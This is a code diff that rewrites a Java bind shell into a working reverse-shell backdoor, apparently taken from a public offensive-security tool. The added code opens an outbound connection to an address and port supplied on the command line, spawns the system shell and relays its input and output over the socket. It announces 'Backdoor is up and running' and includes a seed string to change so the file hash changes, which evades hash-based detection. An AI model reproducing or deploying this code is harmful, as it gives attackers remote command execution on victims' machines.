@@ -1,28 +1,31 @@
-package apps.ReverseShell;
+package apps.ReverseShell.originals;
 
+//Copyright (c) 2021 Ivan Šincek
+//Requires Java SE v8 or greater and JDK v8 or greater.
+//Works on Linux OS, macOS, and Windows OS.
 
 
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.net.ServerSocket;
+import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketTimeoutException;
 import java.util.Arrays;
 
-public class BindShell {
+public class ReverseShell {
  
  // NOTE: Change seed to help you change the file hash.
- private String seed    = "3301Kira";
- private int     port   = -1;
- private String  os     = null;
- private String  shell  = null;
- private byte[]  buffer = null;
- private int     clen   = 0;
- private boolean error  = false;
+ private String seed              = "3301Kira";
+ private InetSocketAddress addr   = null;
+ private String            os     = null;
+ private String            shell  = null;
+ private byte[]            buffer = null;
+ private int               clen   = 0;
+ private boolean           error  = false;
  
- public BindShell(int port) {
-     this.port = port;
+ public ReverseShell(String addr, int port) {
+     this.addr = new InetSocketAddress(addr, port);
  }
  
  private boolean detect() {
@@ -37,11 +40,8 @@ public class BindShell {
      } else {
          detected   = false;
          System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
-         controller.Controller.restart();
      }
-     
      return detected;
-     
  }
  
  // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
@@ -68,38 +68,30 @@ public class BindShell {
                  } else if (iname.equals("SOCKET")) {
                      this.error = true;
                      System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
-                     
                  }
              }
          } while (input.available() > 0);
      } catch (SocketTimeoutException ex) {} catch (IOException ex) {
          this.error = true;
          System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n\n", iname, oname));
-         controller.Controller.restart();
      }
  }
  
  public void run() {
      if (this.detect()) {
-         ServerSocket listener = null;
+         Socket       client  = null;
+         OutputStream socin   = null;
+         InputStream  socout  = null;
          
-         Socket       client   = null;
-         OutputStream socin    = null;
-         InputStream  socout   = null;
+         Process      process = null;
+         OutputStream stdin   = null;
+         InputStream  stdout  = null;
+         InputStream  stderr  = null;
          
-         Process      process  = null;
-         OutputStream stdin    = null;
-         InputStream  stdout   = null;
-         InputStream  stderr   = null;
-         
-         System.out.print("Backdoor is up and running...\n\n");
-         System.out.print("Waiting for client to connect...\n\n");
          try {
-             listener = new ServerSocket(this.port);
-             do {
-                 client = listener.accept();
-             } while (client == null);
+             client = new Socket();
              client.setSoTimeout(100);
+             client.connect(this.addr);
              socin  = client.getOutputStream();
              socout = client.getInputStream();
              
@@ -110,7 +102,7 @@ public class BindShell {
              stdout  = process.getInputStream();
              stderr  = process.getErrorStream();
              
-             System.out.print("Client has connected!\n\n");
+             System.out.print("Backdoor is up and running...\n\n");
              do {
                  if (!process.isAlive()) {
                      System.out.print("PROC_ERROR: Shell process has been terminated\n\n"); break;
@@ -119,7 +111,7 @@ public class BindShell {
                  if (stderr.available() > 0) { this.brw(stderr, socin, "STDERR", "SOCKET"); }
                  if (stdout.available() > 0) { this.brw(stdout, socin, "STDOUT", "SOCKET"); }
              } while (!this.error);
-             System.out.print("Client has disconnected!\n");
+             System.out.print("Backdoor will now exit...\n");
          } catch (IOException ex) {
              System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
          } finally {
@@ -133,26 +125,37 @@ public class BindShell {
              if (client != null) { try { client.close(); } catch (IOException ex) {} }
              
              if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
-             
-             if (listener != null) { try { listener.close(); } catch (IOException ex) {} }
-             
          }
      }
  }
  
  public static void main(String[] args) {
-     if (args.length != 1) {
-         System.out.print("Usage: java -jar Bind_Shell.jar <port>\n");
+     System.out.print("#######################################################################\n");
+     System.out.print("#                                                                     #\n");
+     System.out.print("#                        Java Reverse TCP v2.7                        #\n");
+     System.out.print("#                                    by Ivan Sincek                   #\n");
+     System.out.print("#                                                                     #\n");
+     System.out.print("# GitHub repository at github.com/ivan-sincek/java-reverse-tcp.       #\n");
+     System.out.print("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #\n");
+     System.out.print("#                                                                     #\n");
+     System.out.print("#######################################################################\n");
+     if (args.length != 2) {
+         System.out.print("Usage: java -jar Reverse_Shell.jar <addr> <port>\n");
      } else {
          boolean error = false;
-         int port = -1;
          args[0] = args[0].trim();
          if (args[0].length() < 1) {
+             error = true;
+             System.out.print("Address is required\n");
+         }
+         int port = -1;
+         args[1] = args[1].trim();
+         if (args[1].length() < 1) {
              error = true;
              System.out.print("Port number is required\n");
          } else {
              try {
-                 port = Integer.parseInt(args[0]);
+                 port = Integer.parseInt(args[1]);
                  if (port < 0 || port > 65535) {
                      error = true;
                      System.out.print("Port number is out of range\n");
@@ -163,7 +166,7 @@ public class BindShell {
              }
          }
          if (!error) {
-             BindShell sh = new BindShell(port);
+             ReverseShell sh = new ReverseShell(args[0], port);
              sh.run();
              // don't forget to call the garbage cleaner
              sh = null;
